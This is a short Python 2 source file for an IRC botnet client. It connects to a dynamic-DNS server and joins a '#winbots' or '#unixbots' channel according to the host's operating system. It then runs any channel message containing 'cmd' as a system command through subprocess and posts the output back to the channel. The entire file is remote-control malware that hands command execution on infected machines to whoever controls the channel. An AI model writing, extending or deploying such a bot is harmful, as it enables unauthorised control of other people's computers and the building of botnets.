import socket, os
import subprocess

#SETTINGS:
if  os.name=="nt":
	settings_channel = "#winbots"
else:
	settings_channel = "#unixbots"
	
settings_server = "jpdias.noip.me"
settings_port = 1723

settings_botnick = "bot-"+socket.gethostname()
settings_botpass = "password"
settings_owner = "root"
settings_commandprefix = "!"

#USER COMMAND FUNCTIONS:
def ParseUserCommands(irc, messageSender, messageChannel, messageSent):
	parseMessage = messageSent.split(" ")
	if len(parseMessage) > 1 and parseMessage[0] == (settings_commandprefix + "echo"):
		echoMessage = messageSent.split(" ", 1)[1]
		irc.send("PRIVMSG " + messageChannel + " :" + echoMessage + "\r\n")
		#print "--> PRIVMSG " + messageChannel + " :" + echoMessage

#EXECUTE COMMANDS

def ExecCmd(cmd):
	try :
		output =  subprocess.Popen(cmd, stdout=subprocess.PIPE).communicate()[0]
		irc.send ( 'PRIVMSG ' + messageChannel + ' :'+ output.replace("\r"," - ").replace("\n"," - ") +'\r\n' )
	except :
		output = "FAILED"
		irc.send ( 'PRIVMSG ' + messageChannel + ' :'+ output +'\r\n' )

#CONNECT:
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((settings_server, settings_port))
irc.send("USER " + settings_botnick + " " + settings_botnick + " " + settings_botnick + " :IRC bot maintained by " + settings_owner + "\r\n")
irc.send("NICK " + settings_botnick + "\r\n")
irc.send("PRIVMSG NickServ :identify " + settings_botpass + "\r\n")
irc.send("JOIN " + settings_channel + "\r\n")
#irc.send("PRIVMSG " + channel + " :Hi\r\n")

#MAIN LOOP:
while True:
	recvText = irc.recv(2048) #Text read from the server
	recvText = recvText.split("\r\n")[0] # immediately take away the "\r\n" from the end of the string
	#print "<-- " + recvText #Print the text to terminal for debugging
	parseText = recvText.split(" ")

	try:
		if parseText[1] == "PRIVMSG":
			#Handle PRIVMSGs here
			privmsgText = recvText.split(" ", 3)
			messageSender = privmsgText[0].lstrip(":").split("!")[0]
			messageChannel = privmsgText[2]
			messageSent = privmsgText[3].lstrip(":")
			#print "messageSender:", messageSender, "messageChannel:", messageChannel, "messageSent:", messageSent
			if messageSent[0] == settings_commandprefix:
				ParseUserCommands(irc, messageSender, messageChannel, messageSent)
			if messageSent.find ( 'cmd' ) != -1:
				ExecCmd(messageSent.split(':')[1])
		if parseText[0] == "PING":
			#Respond to PINGs
			pingSender = parseText[1].split(":")[1]
			irc.send("PONG :" + pingSender + "\r\n")
			#print "--> PONG :" + pingSender

	except IndexError:
		#If we can't parse the text, just ignore it and hope that it wasn't important.
		continue